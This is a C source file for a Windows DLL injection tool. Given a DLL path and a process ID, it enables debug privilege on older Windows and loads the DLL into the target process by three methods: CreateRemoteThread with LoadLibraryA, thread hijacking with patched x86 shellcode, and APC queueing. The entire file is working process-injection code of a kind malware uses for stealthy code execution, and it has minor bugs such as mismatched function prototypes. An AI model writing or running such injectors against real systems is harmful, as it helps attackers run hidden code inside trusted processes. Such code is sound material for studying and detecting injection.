#define _WIN32_WINNT_WINXP
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

// Our shellcode 
unsigned char shellcode[] = {
	0x9C,							// Push all flags
	0x60,							// Push all register
	0x68, 0x42, 0x42, 0x42, 0x42,	// Push dllPathAddr
	0xB8, 0x42, 0x42, 0x42, 0x42,	// Mov eax, loadLibAddr
	0xFF, 0xD0,						// Call eax
	0x61,							// Pop all register
	0x9D,							// Pop all flags
	0xC3							// Ret
};
int version();
FARPROC loadLibraryAddress();
LPVOID virtualAlloc(HANDLE hProcess, char *dll);
BOOL writeProcessMemory(HANDLE hProcess, LPVOID virtualAlloc, char *dll);
VOID createRemoteThreadMethod(HANDLE hProcess, FARPROC loadLibraryAddress, LPVOID virtualAlloc);
VOID shellcodeMethod(HANDLE hProcess, LPVOID loadLibAddr, LPVOID dllPathAddr);
DWORD writeShellcodeInProcessMemory(HANDLE hProcess, HANDLE hThread, LPVOID dll, FARPROC loadLibraryAddress);
VOID apcMethod(HANDLE hProcess);

int main(int argc, char *argv[]){
	if (argc != 3){
		printf("Usage: %s <DLL> <PID>\n", argv[0]);
		exit(0);
	}

	char* dll = argv[1];
	int pid = atoi(argv[2]);

	// Enable debug privilege for xp (inject in system process)
	if (version()<6){
		HANDLE hProcess = GetCurrentProcess();
		HANDLE hToken;
		if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)){
			SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
			CloseHandle(hToken);
			printf("[+] Debug privilege\n");
		}
	}

	// Attach to the process through his PID
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("[-] OpenProcess failed\n");
		exit(0);
	}
	else
		printf("[+] OpenProcess success\n");

	FARPROC llAddr = loadLibraryAddress();
	LPVOID dllAddr = virtualAlloc(hProcess, dll);
	writeProcessMemory(hProcess, dllAddr, dll);

	createRemoteThreadMethod(hProcess, llAddr, dllAddr);
	//shellcodeMethod(hProcess, llAddr, dllAddr);
	//apcMethod(hProcess, dllAddr, llAddr);
	CloseHandle(hProcess);

	return 0;
}

// Find the version of the os
int version(){
	OSVERSIONINFO osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	return osvi.dwMajorVersion;
}

// SetPrivilege enables/disables process token privilege.
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){
	LUID luid;
	BOOL bRet = FALSE;

	if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid)){
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;
		//
		//  Enable the privilege or disable all privileges.
		//
		if (AdjustTokenPrivileges(hToken, FALSE, &tp, (DWORD)NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
			//
			//  Check to see if you have proper access.
			//  You may get "ERROR_NOT_ALL_ASSIGNED".
			//
			bRet = (GetLastError() == ERROR_SUCCESS);
	}
	return bRet;
}

// Determine the address of LoadLibraryA
FARPROC loadLibraryAddress(){
	FARPROC LLA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryA");
	if (LLA == NULL) {
		printf("[-] LoadLibraryA address not found");
		exit(0);
	}
	else
		printf("[+] LoadLibraryA address found 0x%08x\n", LLA);
	return LLA;
}

// Allocate Memory for the DLL
LPVOID virtualAlloc(HANDLE hProcess, char *dll){
	LPVOID VAE = (LPVOID)VirtualAllocEx(hProcess, NULL, strlen(dll), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (VAE == NULL) {
		printf("[-] VirtualAllocEx failed");
		exit(0);
	}
	else
		printf("[+] VirtualAllocEx  0x%08x\n", VAE);
	return VAE;
}

// Copy the DLL into the targeted process memory allocation
BOOL writeProcessMemory(HANDLE hProcess, LPVOID dllAddr, char *dll){
	BOOL WPM = WriteProcessMemory(hProcess, dllAddr, dll, strlen(dll), NULL);
	if (!WPM) {
		printf("[-] WriteProcessMemory failed");
		exit(0);
	}
	else
		printf("[+] WriteProcessMemory success\n");
	return WPM;
}

// Execute the DLL into the targeted process with CreateRemoteThread method
VOID createRemoteThreadMethod(HANDLE hProcess, FARPROC loadLibraryAddress, LPVOID virtualAlloc){
	HANDLE CRT = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, virtualAlloc, 0, NULL);
	if (CRT == NULL) {
		printf("[-] CreateRemoteThread failed\n");
		exit(0);
	}
	else
		printf("[+] CreateRemoteThread success\n");
}

// Suspend process, inject shellcode, redirect eip and resume process
VOID shellcodeMethod(HANDLE hProcess, FARPROC llAddr, LPVOID dllAddr) {
	// Takes a snapshot of all threads in the system, 0 to current process
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE){
		printf("[-] CreateToolhelp32Snapshot failed\n");
		exit(0);
	}
	else
		printf("[+] CreateToolhelp32Snapshot success\n");

	// Retrieves information about the first thread of any process encountered in a system snapshot.
	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	if (Thread32First(hThreadSnap, &te32) == FALSE){
		printf("[-] Thread32First failed\n");
		exit(0);
	}
	else
		printf("[+] Thread32First success\n");

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	DWORD TID = 0;
	HANDLE hThread;
	do{
		if (te32.th32OwnerProcessID == GetProcessId(hProcess)){
			if (TID == 0)
				TID = te32.th32ThreadID;
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			if (hThread == NULL){
				printf("[-] OpenThread failed\n");
				exit(0);
			}
			else{
				SuspendThread(hThread);
				CloseHandle(hThread);
				printf("[+] Suspend thread 0x%08X\n", te32.th32ThreadID);
			}
		}
	} while (Thread32Next(hThreadSnap, &te32));
	CloseHandle(hThreadSnap);

	// Inject
	CONTEXT   lpContext;
	lpContext.ContextFlags = CONTEXT_FULL;
	HANDLE targetThread = NULL;

	// Open targeted thread
	targetThread = OpenThread(THREAD_ALL_ACCESS, FALSE, TID);
	if (targetThread == NULL){
		printf("[-] OpenThread failed\n");
		exit(0);
	}
	else
		printf("[+] Target thread 0x%08X\n", targetThread);

	// Get eip & esp adresses
	if (!GetThreadContext(targetThread, &lpContext)){
		printf("[-] GetThreadContext failed\n");
		exit(0);
	}
	else
		printf("\tEIP : 0x%08x\n\tESP : 0x%08x\n\tEBP : 0x%08x\n", lpContext.Eip, lpContext.Esp, lpContext.Ebp);

	// Save eip, esp & ebp
	// Allocate 4 bytes on the top of the stack for the RET
	lpContext.Esp -= sizeof(unsigned int);
	if (!WriteProcessMemory(hProcess, (LPVOID)lpContext.Esp, (LPCVOID)&lpContext.Eip, sizeof(unsigned int), NULL)) {
		printf("[-] WriteProcessMemory failed");
		exit(0);
	}
	else
		printf("[+] WriteProcessMemory success\n");
	printf("\tEIP : 0x%08x\n\tESP : 0x%08x\n\tEBP : 0x%08x\n", lpContext.Eip, lpContext.Esp, lpContext.Ebp);

	// Patch the shellcode with the addresses of LoadLibraryA & the DLL in targeted process memory
	shellcode[3] = ((unsigned int)dllAddr & 0xFF);
	shellcode[4] = (((unsigned int)dllAddr >> 8) & 0xFF);
	shellcode[5] = (((unsigned int)dllAddr >> 16) & 0xFF);
	shellcode[6] = (((unsigned int)dllAddr >> 24) & 0xFF);
	shellcode[8] = ((unsigned int)llAddr & 0xFF);
	shellcode[9] = (((unsigned int)llAddr >> 8) & 0xFF);
	shellcode[10] = (((unsigned int)llAddr >> 16) & 0xFF);
	shellcode[11] = (((unsigned int)llAddr >> 24) & 0xFF);

	// Display shellcode
	int i;
	printf("[+] Shellcode:\n");
	for (i = 0; i<sizeof(shellcode); i++)
		printf("%02x ", shellcode[i]);
	printf("\n");

	// Allocate memory in the targeted process for our shellcode
	LPVOID shellcodeAddress;
	shellcodeAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL){
		printf("[-] VirtualAllocEx failed");
		exit(0);
	}
	else
		printf("[+] Allocating %d bytes for our shellcode\n", sizeof(shellcode));

	// Write the shellcode into the targeted thread
	if (!WriteProcessMemory(hProcess, shellcodeAddress, (LPCVOID)shellcode, sizeof(shellcode), NULL)){
		printf("[-] WriteProcessMemory failed");
		exit(0);
	}
	else
		printf("[+] WriteProcessMemory success\n");

	// Redirect eip to the shellcode address
	lpContext.Eip = (DWORD)shellcodeAddress;
	printf("\tEIP : 0x%08x\n\tESP : 0x%08x\n\tEBP : 0x%08x\n", lpContext.Eip, lpContext.Esp, lpContext.Ebp);
	if (!SetThreadContext(targetThread, &lpContext)){
		printf("[-] SetThreadContext failed\n");
		exit(0);
	}
	else
		printf("[+] SetThreadContext success\n");

	// Resume Threads
	// Takes a snapshot of all threads in the system, 0 to current process
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	te32.dwSize = sizeof(THREADENTRY32);
	if (hThreadSnap == INVALID_HANDLE_VALUE){
		printf("[-] CreateToolhelp32Snapshot failed\n");
		exit(0);
	}
	else
		printf("[+] CreateToolhelp32Snapshot success\n");

	// Retrieves information about the first thread of any process encountered in a system snapshot.
	if (Thread32First(hThreadSnap, &te32) == FALSE){
		printf("[-] Thread32First failed\n");
		exit(0);
	}
	else
		printf("[+] Thread32First success\n");
	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	do{
		if (te32.th32OwnerProcessID == GetProcessId(hProcess)){
			printf("\tTHREAD ID = 0x%08X\n", te32.th32ThreadID);
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			if (hThread == NULL){
				printf("[-] OpenThread failed\n");
				exit(0);
			}
			else{
				ResumeThread(hThread);
				if (te32.th32ThreadID == TID)
					WaitForSingleObject(hThread, 5000);
				CloseHandle(hThread);
				printf("[+] Resume\n");
			}
		}
	} while (Thread32Next(hThreadSnap, &te32));
	CloseHandle(hThreadSnap);
}

// Write our shellcode in the process memory
DWORD writeShellcodeInProcessMemory(HANDLE hProcess, HANDLE hThread, LPVOID dllAddr, FARPROC llAddr){
	CONTEXT lpContext;
	lpContext.ContextFlags = CONTEXT_FULL;

	// Get eip & esp adresses
	if (!GetThreadContext(hThread, &lpContext)){
		printf("[-] GetThreadContext failed\n");
		exit(0);
	}
	else
		printf("\tEIP : 0x%08x\n\tESP : 0x%08x\n\tEBP : 0x%08x\n", lpContext.Eip, lpContext.Esp, lpContext.Ebp);

	// Save eip, esp & ebp
	// Allocate 4 bytes on the top of the stack for the RET
	lpContext.Esp -= sizeof(unsigned int);
	if (!WriteProcessMemory(hProcess, (LPVOID)lpContext.Esp, (LPCVOID)&lpContext.Eip, sizeof(unsigned int), NULL)) {
		printf("[-] WriteProcessMemory failed");
		exit(0);
	}
	else
		printf("[+] WriteProcessMemory success\n");
	printf("\tEIP : 0x%08x\n\tESP : 0x%08x\n\tEBP : 0x%08x\n", lpContext.Eip, lpContext.Esp, lpContext.Ebp);

	// Patch the shellcode with the addresses of LoadLibraryA & the DLL in targeted process memory
	shellcode[3] = ((unsigned int)dllAddr & 0xFF);
	shellcode[4] = (((unsigned int)dllAddr >> 8) & 0xFF);
	shellcode[5] = (((unsigned int)dllAddr >> 16) & 0xFF);
	shellcode[6] = (((unsigned int)dllAddr >> 24) & 0xFF);
	shellcode[8] = ((unsigned int)llAddr & 0xFF);
	shellcode[9] = (((unsigned int)llAddr >> 8) & 0xFF);
	shellcode[10] = (((unsigned int)llAddr >> 16) & 0xFF);
	shellcode[11] = (((unsigned int)llAddr >> 24) & 0xFF);

	// Display shellcode
	int i;
	printf("[+] Shellcode:\n");
	for (i = 0; i<sizeof(shellcode); i++)
		printf("%02x ", shellcode[i]);
	printf("\n");

	// Allocate memory in the targeted process for our shellcode
	LPVOID shellcodeAddress;
	shellcodeAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL){
		printf("[-] VirtualAllocEx failed");
		exit(0);
	}
	else
		printf("[+] Allocating %d bytes for our shellcode\n", sizeof(shellcode));

	// Write the shellcode into the targeted thread
	if (!WriteProcessMemory(hProcess, shellcodeAddress, (LPCVOID)shellcode, sizeof(shellcode), NULL)){
		printf("[-] WriteProcessMemory failed");
		exit(0);
	}
	else
		printf("[+] WriteProcessMemory success\n");

	return (DWORD)shellcodeAddress;
}

// Suspend process add shellcode address to APC queue and resume thread
VOID apcMethod(HANDLE hProcess, LPVOID dllAddr, FARPROC llAddr){
	// Takes a snapshot of all threads in the system, 0 to current process
	HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE){
		printf("[-] CreateToolhelp32Snapshot()\n");
		exit(0);
	}
	else
		printf("[+] CreateToolhelp32Snapshot()\n");

	// Retrieves information about the first thread of any process encountered in a system snapshot.
	THREADENTRY32 te32;
	te32.dwSize = sizeof(THREADENTRY32);
	if (Thread32First(hThreadSnap, &te32) == FALSE){
		printf("[-] Thread32First()\n");
		exit(0);
	}
	else
		printf("[+] Thread32First()\n");

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	int TID;
	HANDLE hThread;
	PAPCFUNC pfnAPC;
	do{
		if (te32.th32OwnerProcessID == GetProcessId(hProcess)){
			TID = te32.th32ThreadID;
			printf("\tTHREAD ID = 0x%08X\n", te32.th32ThreadID);
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, TID);
			if (hThread == NULL){
				printf("[-] OpenThread()\n");
				exit(0);
			}
			else{
				printf("[+] OpenThread()\n");

				pfnAPC = (PAPCFUNC)writeShellcodeInProcessMemory(hProcess, hThread, dllAddr, llAddr);
				if (!pfnAPC)
					exit(0);

				if (!QueueUserAPC(pfnAPC, hThread, (ULONG_PTR)NULL)){
					printf("[-] QueueUserAPC()\n");
					exit(0);
				}
				else
					printf("[+] QueueUserAPC()\n");
			}
			CloseHandle(hThread);

		}
	} while (Thread32Next(hThreadSnap, &te32));
	CloseHandle(hThreadSnap);
	CloseHandle(hProcess);
}
